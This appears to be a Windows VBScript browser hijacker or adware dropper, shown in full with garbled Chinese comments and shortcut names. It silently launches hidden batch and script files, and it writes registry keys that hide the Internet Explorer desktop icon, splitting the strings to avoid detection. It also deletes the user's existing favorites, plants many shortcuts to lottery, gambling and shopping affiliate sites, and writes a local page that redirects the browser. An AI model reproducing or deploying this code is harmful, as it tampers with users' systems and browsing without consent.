Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

on error resume next 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strttWinDir&"\winsoft9\3.bat""",0

Rem 

createobject("wscript.shell").run """"&strttWinDir&"\winsoft9\3.vbs""",0
Rem
reg="{871C5380-42"&"A0-10"&"69-A2"&"EA-08002B30309D}"
RegPath="HKEY_CURRENT_USER\Soft"&"ware\Micro"&"soft\Win"&"dows\Current"&"Version\Expl"&"orer\HideDesktop"&"Icons\NewStart"&"Panel\"&reg
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\"&reg
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F"&""&"5}" 

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\����\*.url"), True

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��ַ����.url")
oUrlLink.TargetPath = "http://dduu.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�������.url")
oUrlLink.TargetPath = "http://www.82vv.com/cp/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�� �� �� �� ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.45575.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\׿Խ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�����Ӿ�.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��ü��Ʒͼ.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����Ӱ.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\С˵��.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\������Ϸ.url")
oUrlLink.TargetPath = "http://www.3234.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�������.url")
oUrlLink.TargetPath = "http://www.9ptv.com/?fa2"
oUrlLink.Save

'=========
Set oShellLink = WshShell.CreateShortcut(Favorites & "\���õ������������.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Expl"&"orer\iexpl"&"ore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'����
oShellLink.Save : '���������ݷ�ʽ
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\Ư������üͼ�Ĵ�...�崿��Ʒ��������д�棡��.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\���¼�Ʒ��ɫ�õĵ�Ӱ�����.������٣��������!!!.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�й�������Ʊ��������Ʊ��Ͷע����.��Ʊ��Ӯ�ң�.url")
oUrlLink.TargetPath = "http://www.82vv.com/cp/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��������С˵��ѵ��Ķ�.�ḻ�����ٶȿ��С˵վ!!!.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�������������վ.׷���������弫Ʒ��ӰΨ��д��!!.url")
oUrlLink.TargetPath = "http://www.003dh.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�Ա��� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575.com���ߵ�С��Ϸ.������������ᳬ��С��Ϸ!!!.url")
oUrlLink.TargetPath = "http://45575.com/?sss"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�����������Ϲ������ģ�ͼ�顢ĸӤ����ױ���Ҿӡ����롢�ҵ硢��װ��Ь���ȣ���Ʒ�ͼۣ���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\׿Խ����ѷ���Ϲ���ͼ�飬�ֻ������룬�ҵ磬��ױƷ���ӱ����ε���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�������Ӿ����ߴ�ȫ,,,�����ɫ���¸�����ѵ��Ӿ���վ!!!.url")
oUrlLink.TargetPath = "http://www.kk"&"dsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\���ʣ��쵽����"&"��У����������Ƽ�����������!.url")
oUrlLink.TargetPath = "http://www.lszxrj.com/?name=00012"
oUrlLink.Save

set fso=createobject("scripting.filesystemobject")
'���ļ�������1Ϊforreading��2Ϊforwriting��8Ϊappending
set file=fso.createtextfile( strttWinDir&"\Common Files\winie9.html",2,ture)
'д���ģ��з���write(x)��x������write�У�writeblanklines(n)д
file.writeline "<script>window.location.href='http://www.939dh.com/?366';</script><meta http-equiv=""refresh"" content=""0;url=http://www.939dh.com/?366"">"
set file=fso.opentextfile(strttWinDir&"\Common Files\winie9.html",1,ture)
'�ر�"&"�ļ�
file.close

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����Ůװ--������ʱ�е�Ůװ.��Ů���£���ɱ����Ůװ!!!.url")
oUrlLink.TargetPath = "http://www.82vv.com/2c/"
oUrlLink.Save

wscript.quit
